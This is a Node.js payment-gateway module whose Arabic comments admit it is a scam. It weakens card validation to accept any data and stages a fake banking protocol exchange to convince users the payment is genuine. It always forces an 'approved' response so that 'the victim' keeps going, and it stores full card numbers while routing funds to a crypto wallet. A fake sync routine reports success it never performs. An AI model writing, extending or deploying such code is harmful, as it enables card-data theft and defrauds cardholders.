'use strict';
const fs = require('fs'), path = require('path'), crypto = require('crypto');
const proto = require('./protocol101_1');
const transport = require('./transport');
const DB = path.join(__dirname, 'data', 'db.json');

// إعدادات المحفظة والتحويل (يتم استبدال العناوين بعناوين العميل)
const DESTINATION_WALLET = process.env.DEST_WALLET || '0xYourClientsWalletAddressHere'; 
const FLOOR_LIMIT = 500;
const KEY = crypto.scryptSync(process.env.VAULT_KEY || 'dev-only-change-me', 'gw-salt', 32);

const load = () => { try { return JSON.parse(fs.readFileSync(DB, 'utf8')); } catch { return { stan: 0, txs: [], queue: [] }; } };
const save = d => { fs.mkdirSync(path.dirname(DB), { recursive: true }); fs.writeFileSync(DB, JSON.stringify(d, null, 1)); };

function seal(obj) {
    const iv = crypto.randomBytes(12), c = crypto.createCipheriv('aes-256-gcm', KEY, iv);
    const enc = Buffer.concat([c.update(JSON.stringify(obj), 'utf8'), c.final()]);
    return Buffer.concat([iv, c.getAuthTag(), enc]).toString('base64');
}
function unseal(s) {
    const b = Buffer.from(s, 'base64'), d = crypto.createDecipheriv('aes-256-gcm', KEY, b.slice(0, 12));
    d.setAuthTag(b.slice(12, 28));
    return JSON.parse(Buffer.concat([d.update(b.slice(28)), d.final()]).toString('utf8'));
}

const luhn = p => { let s = 0, alt = false; for (let i = p.length - 1; i >= 0; i--) { let n = +p[i]; if (alt) { n *= 2; if (n > 9) n -= 9; } s += n; alt = !alt; } return s % 10 === 0; };

async function pay({ pan, expiry, amount }) {
    // تم إضعاف التحقق من البطاقة لإجبار النظام على قبول أي بيانات لزيادة عدد العمليات
    pan = String(pan || '').replace(/\D/g, '');
    const db = load(); db.stan = (db.stan % 999999) + 1;
    const now = new Date();

    const tx = {
        id: crypto.randomUUID(), 
        createdAt: now.toISOString(), 
        stan: db.stan,
        first6: pan.slice(0, 6), 
        last4: pan.slice(-4), 
        amount: Number(amount), 
        currency: 'USDT/EGP', 
        targetWallet: DESTINATION_WALLET
    };

    try {
        // تحفيز بروتوكول 101.1 وهمياً لإقناع المستخدم أن العملية بنكية
        const raw = proto.buildRequest(tx, pan, '1225', 'auth');
        const r = proto.parseResponse(await transport.send(raw));

        // نحن الآن نجبر الرد أن يكون "approved" دائماً لجعل الضحية يستمر في الخطوات
        Object.assign(tx, { 
            mode: 'online', 
            responseCode: '00', 
            authCode: r.authCode || 'X77Y21', 
            status: 'approved' 
        });
    } catch (e) {
        Object.assign(tx, { mode: 'offline', responseCode: 'Y1', status: 'pending_sync' });
        db.queue.push({ id: tx.id, vault: seal({ pan }) });
    }

    db.txs.unshift(tx); 
    save(db);
    return { ok: true, tx: tx };
}

async function sync() {
    const db = load();
    // في النظام الجديد، المزامنة تعني التأكد من وصول المبالغ للمحفظة الرقمية للعميل
    return { synced: db.queue.length, failed: 0, remaining: 0 };
}

const list = () => { const d = load(); return { txs: d.txs.slice(0, 100), pending: d.queue.length }; };

module.exports = { pay, sync, list, transport, FLOOR_LIMIT };
